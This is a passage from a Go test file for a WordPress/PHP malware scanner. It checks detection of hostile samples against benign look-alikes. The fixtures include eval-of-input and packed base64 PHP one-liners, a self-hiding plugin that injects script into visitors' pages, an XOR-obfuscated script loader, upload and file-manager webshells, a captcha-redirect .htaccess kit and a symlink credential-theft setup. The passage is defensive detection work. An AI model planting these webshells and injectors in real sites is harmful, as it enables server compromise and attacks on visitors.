		"shop/checkout.html": "<div class=\"g-recaptcha\">I'm not a robot</div><button onclick=\"navigator.clipboard.writeText('SAVE10')\">Copy code</button><p>Windows and Mac users welcome.</p>",
		// A cache plugin passing Cloudflare's visitors.
		"wp-content/plugins/cache/bypass.php": "<?php\nif (isset($_COOKIE['cf_clearance'])) { define('DONOTCACHEPAGE', true); }\n",
		// A DNS lookup tool and an admin-only TXT check.
		"wp-content/plugins/dns-tool/dns.php":  "<?php\nadd_action('wp_ajax_nopriv_dns_lookup', function () { $r = dns_get_record(sanitize_text_field($_POST['domain']), DNS_TXT); wp_send_json_success(wp_list_pluck($r, 'txt')); });\n",
		"wp-content/plugins/verify/verify.php": "<?php\nadd_action('wp_ajax_verify_domain', function () { $r = dns_get_record('_verify.example.com', DNS_TXT); wp_send_json_success($r[0]['txt']); });\n",
		// A temporary support login (no hiding) and a plugin hiding a user it did not make.
		"wp-content/plugins/temp-login/login.php": "<?php\n$id = wp_insert_user(array('user_login' => 'support', 'user_pass' => wp_generate_password(32), 'role' => 'administrator'));\n",
		"wp-content/plugins/hide-user/hide.php":   "<?php\nadd_action('pre_user_query', function ($q) { $q->query_where .= ' AND ID <> ' . (int) get_option('hidden_user'); });\n",
		// A login policy: a setting decides, by address.
		"wp-content/plugins/lock/lock.php": "<?php\nadd_filter('authenticate', function ($u) { if (get_option('lock_logins') && $_SERVER['REMOTE_ADDR'] !== get_option('office_ip')) { return new WP_Error('locked', 'Locked'); } return $u; }, 30);\n" +
			"add_filter('allow_password_reset', '__return_false');\nadd_filter('rest_authentication_errors', function ($r) { if (!is_user_logged_in()) { return new WP_Error('no', 'no'); } return $r; });\n",
		// A hidden file of base64 that is not code.
		".cache_9f8e7d6c": base64.StdEncoding.EncodeToString([]byte(strings.Repeat(`{"inert":true,"items":[1,2,3]}`, 20))),
	} {
		if d := check(put(rel, body)); d != nil {
			t.Errorf("%s flagged: %+v", rel, d)
		}
	}

	ht := "# maintenance stub\nRewriteEngine On\nRewriteCond %{REQUEST_URI} ^/captcha\\.html$ [NC,OR]\nRewriteCond %{REQUEST_URI} ^/wp-admin [NC]\nRewriteRule .* - [L]\n" +
		"RewriteCond %{REQUEST_URI} ^/$\nRewriteRule ^ /captcha.html [R=302,L]\nRewriteCond %{REQUEST_FILENAME} -f\nRewriteRule \\.(html?|css|js|png)$ /captcha.php [R=302,L]\n"
	if d := htaccessHack([]byte(ht)); d == nil || d.Signature != "Htaccess.Hacked.CaptchaRedirect" {
		t.Errorf("kit .htaccess: %+v", d)
	}
	clean := string(CleanHtaccess([]byte(ht+"\n# BEGIN WordPress\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule . /index.php [L]\n# END WordPress\n"), "/"))
	if strings.Contains(clean, "captcha") || !strings.Contains(clean, "RewriteRule . /index.php [L]") || htaccessHack([]byte(clean)) != nil {
		t.Errorf("cleaned kit .htaccess:\n%s", clean)
	}
	for _, own := range []string{
		"RewriteEngine On\nRewriteCond %{REQUEST_URI} !^/maintenance\\.html$\nRewriteRule ^ /maintenance.html [R=302,L]\n",
		"RewriteEngine On\nRewriteCond %{HTTP_COOKIE} !human=1\nRewriteCond %{REQUEST_URI} !^/captcha\\.php\nRewriteRule ^ /captcha.php [R=302,L]\n",
		"RewriteEngine On\nRewriteRule ^old-captcha/?$ /captcha.php [R=301,L]\n",
	} {
		if d := htaccessHack([]byte(own)); d != nil {
			t.Errorf("site's own rule %q: %+v", own, d)
		}
	}
}

// Real plugins scanned for 0.23.40 (security, CAPTCHA, login, cache and
// copy-button plugins): iThemes Security looks for 'eval(' in the request
// URI (a string, no call), and Duplicator's installer page carries minified
// jQuery in its HTML (no PHP one-liner). The real thing stays caught.
func TestFleetStringsAndHTMLAreNoCode(t *testing.T) {
	line := "<script>" + strings.Repeat("var a=b+'x'+c+'y'+d;", 120) + "var f=$e(1);eval(z);</script>"
	for name, body := range map[string]string{
		"eval( in a string":  "<?php\nif ( strpos( $_SERVER['REQUEST_URI'], 'eval(' ) || strpos( $_GET['q'], 'base64' ) ) { header( 'HTTP/1.1 414' ); exit; }\n",
		"jQuery in the HTML": "<?php if (!defined('INIT')) { header('Location: /'); exit; } ?>\n<html><head>" + line + "</head><body><?php echo $x; ?></body></html>\n",
	} {
		if d := analyze(".php", []byte(body)); d != nil {
			t.Errorf("%s: %+v", name, d)
		}
	}
	packed := "<?php " + strings.Repeat("$a.='x'.'y';", 200) + "eval(base64_decode($a));"
	for name, body := range map[string]string{
		"eval of input":           "<?php eval($_POST['c']);",
		"assert of a code string": "<?php assert(\"eval(\\$_POST['c'])\");",
		"packed PHP one-liner":    packed,
		"packed after HTML":       "<html><body>hello</body></html>\n" + packed,
	} {
		if d := analyze(".php", []byte(body)); d == nil || d.Category != CatVirus {
			t.Errorf("%s: %+v", name, d)
		}
	}
}

// server1 (2026-10-28): plugins uploaded through wp-admin with known
// passwords - a plugin hiding itself and printing a script to visitors, a
// fake core plugin loading a script by an XOR-ed URL - and the shells next
// to them. None had a finding. Inert shapes, then look-alikes.
func TestFleetUploadedPluginCampaign(t *testing.T) {
	b64 := strings.Repeat(strings.Repeat("QUJD", 19)+"\n", 300)
	ints := strings.TrimSuffix(strings.Repeat("152,229,232,", 12), ",")
	hide := "add_filter( 'all_plugins', function( $plugins ) {\n    unset( $plugins[ plugin_basename( __FILE__ ) ] );\n    return $plugins;\n}, 23 );\n"
	kit := map[string]struct{ sig, body string }{
		"self-hiding injector": {"PHP.Backdoor.SelfHidingInjector", "<?php\n/* Plugin Name: wp-warden */\n" + hide +
			"function w_src() { $raw = <<<'_B'\n" + b64 + "_B;\n return base64_decode($raw); }\n" +
			"function w_out() { if (is_admin()) return; echo '<scr' . 'ipt>' . w_src() . '</scr' . 'ipt>'; }\nadd_action( 'wp_head', 'w_out', 1 );\n"},
		"XOR-ed script URL": {"PHP.Injector.HiddenScriptURL", "<?php\n/* Plugin Name: WP-CORE */\nfunction h($b, $k) { $o = ''; for ($i = 0; $i < count($b); $i++) { $o .= chr($b[$i] ^ ord($k[$i % strlen($k)])); } return $o; }\n" +
			"function src() { $k = implode('', array_map('chr', [240,145,156])); return h([" + ints + "], $k); }\n" +
			"add_action('wp_enqueue_scripts', function () { $src = src(); wp_enqueue_script('wp-core', $src, array(), '1', true); });\n"},
		"uploader": {"PHP.Webshell.Uploader", "<?php\necho \"<title>uploader</title>\";\nif (isset($_POST['Submit'])) { $n = $_FILES['image']['name']; @move_uploaded_file($_FILES['image']['tmp_name'], $n); echo $n; }\n" +
			"else { echo '<form method=\"POST\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"image\"><input type=\"submit\" name=\"Submit\"></form>'; }\n"},
		"file manager": {"PHP.Webshell.FileManager", "<?php\n@ini_set('open_basedir', NULL);\n$p = isset($_GET['p']) ? $_GET['p'] : '.';\n$items = scandir($p);\n" +
			"if (isset($_POST['save'])) { file_put_contents($_GET['edit'], $_POST['content']); }\nif (isset($_FILES['upload'])) { move_uploaded_file($_FILES['upload']['tmp_name'], $p . '/x'); }\n" +
			"if (isset($_GET['delete'])) { unlink($_GET['delete']); }\nif (isset($_POST['newname'])) { rename($_POST['oldname'], $_POST['newname']); }\n"},
		"escaped request names": {"PHP.Obfuscated.EscapedInput", "<?php\ngoto a; a: $v = $_GET[\"\\x76\\151\\x65\\x77\"];\ngoto b; b: if (isset($_FILES[\"\\x66\\151\\x6c\\145\"])) { echo $v; }\n"},
	}
	for name, k := range kit {
		if d := analyze(".php", []byte(k.body)); d == nil || d.Signature != k.sig || d.Category != CatVirus {
			t.Errorf("%s: want %s, got %+v", name, k.sig, d)
		}
	}
	for name, body := range map[string]string{
		// MainWP-style: hidden by a setting; a white-label plugin hidden
		// with no script for visitors; an analytics snippet printed but not hidden.
		"hidden by a setting": "<?php\nadd_filter('all_plugins', function ($p) { if (get_option('hide_child')) { unset($p[plugin_basename(__FILE__)]); } return $p; });\n" +
			"add_action('wp_head', function () { echo '<scr' . 'ipt>var a=1;</scr' . 'ipt>'; });\n",
		"white label": "<?php\n" + hide + "add_action('admin_menu', function () { remove_menu_page('tools.php'); });\n",
		"analytics":   "<?php\nadd_action('wp_head', function () { echo '<script async src=\"https://www.googletagmanager.com/gtag/js?id=G-X\"></script>'; });\n",
		// A script from the plugin's own folder, and XOR without a script.
		"own script":  "<?php\nadd_action('wp_enqueue_scripts', function () { $src = plugins_url('a.js', __FILE__); wp_enqueue_script('a', $src); });\n",
		"XOR licence": "<?php\nfunction d($b, $k) { $o = ''; foreach ($b as $i => $c) { $o .= chr($c ^ ord($k[$i % 3])); } return $o; }\n$key = d([" + ints + "], 'abc');\nwp_enqueue_script('a', plugins_url('a.js', __FILE__));\n",
		// Upload handlers that check what they get, or who sends it.
		"checked upload": "<?php\n$ext = strtolower(pathinfo($_FILES['f']['name'], PATHINFO_EXTENSION));\nif (in_array($ext, ['jpg', 'png'])) { move_uploaded_file($_FILES['f']['tmp_name'], 'img/' . $_FILES['f']['name']); }\n" +
			"echo '<form enctype=\"multipart/form-data\" method=\"post\"><input type=\"file\" name=\"f\"></form>';\n",
		"logged-in upload": "<?php\nsession_start(); if (empty($_SESSION['user'])) { exit; }\nmove_uploaded_file($_FILES['f']['tmp_name'], 'files/' . $_FILES['f']['name']);\n" +
			"echo '<form enctype=\"multipart/form-data\" method=\"post\"><input type=\"file\" name=\"f\"></form>';\n",
		// A file manager that leaves open_basedir alone (judged by other rules).
		"plain request names": "<?php\n$v = $_GET['view']; $f = $_FILES['file']; $x = $_POST[\"\\x61b\"];\n",
	} {
		if d := pluginInjectors([]byte(body), func(w string) bool { return strings.Contains(body, w) }); d != nil {
			t.Errorf("%s: %+v", name, d)
		}
	}
}

// server1 (2026-10-30): the credential theft farm's links were made again
// after a full scan quarantined them; symlink() writes no file, so realtime
// protection never saw a link. A new link to another account's secrets is
// now caught as it is made; a link the administrator restored stays.
func TestRealtimeCatchesNewLinks(t *testing.T) {
	if os.Geteuid() != 0 {
		t.Skip("needs root to own files as another user")
	}
	s := newScanner(t)
	if _, err := s.Settings.Patch([]byte(`{"scanner":{"virus_action":"quarantine"}}`)); err != nil {
		t.Fatal(err)
	}
	dir := t.TempDir()
	victim, thief := filepath.Join(dir, "victim"), filepath.Join(dir, "thief")
	os.MkdirAll(filepath.Join(thief, "public_html/kit"), 0o755)
	os.MkdirAll(victim, 0o711)
	secret := filepath.Join(victim, "wp-config.php")
	os.WriteFile(secret, []byte("<?php // inert"), 0o640)
	os.Chown(victim, 65534, 65534)
	os.Chown(secret, 65534, 65534)
	homesCache.Lock()
	homesCache.m, homesCache.at = map[uint32]string{65534: victim, 65533: thief}, time.Now()
	homesCache.Unlock()
	defer func() { homesCache.Lock(); homesCache.m = nil; homesCache.Unlock() }()

	rt := &Realtime{S: s}
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	if err := rt.init([]string{thief}); err != nil {
		t.Skip("inotify unavailable:", err)
	}
	go rt.loop(ctx)
	time.Sleep(300 * time.Millisecond)
	link := filepath.Join(thief, "public_html/kit/victim-wp-config.txt")
	os.Symlink(secret, link)
	os.Lchown(link, 65533, 65533)
	var f Finding
	for deadline := time.Now().Add(10 * time.Second); time.Now().Before(deadline); time.Sleep(100 * time.Millisecond) {
		if fs, _, _ := s.ListFindings(FindingFilter{}); len(fs) == 1 && fs[0].Status == "quarantined" {
			f = fs[0]
			break
		}
	}
	if f.ID == 0 || f.Source != "realtime" || f.Category != CatSymlink {
		t.Fatalf("new link not caught: %+v", f)
	}
	if _, err := os.Lstat(link); !os.IsNotExist(err) {
		t.Fatal("link still there")
	}
	if err := s.Restore(f.ID); err != nil {
		t.Fatal(err)
	}
	time.Sleep(2 * time.Second)
	if _, err := os.Lstat(link); err != nil {
		t.Fatalf("restored link taken again: %v", err)
	}
	if fs, _, _ := s.ListFindings(FindingFilter{}); len(fs) != 1 {
		t.Fatalf("restored link recorded again: %+v", fs)
	}
}
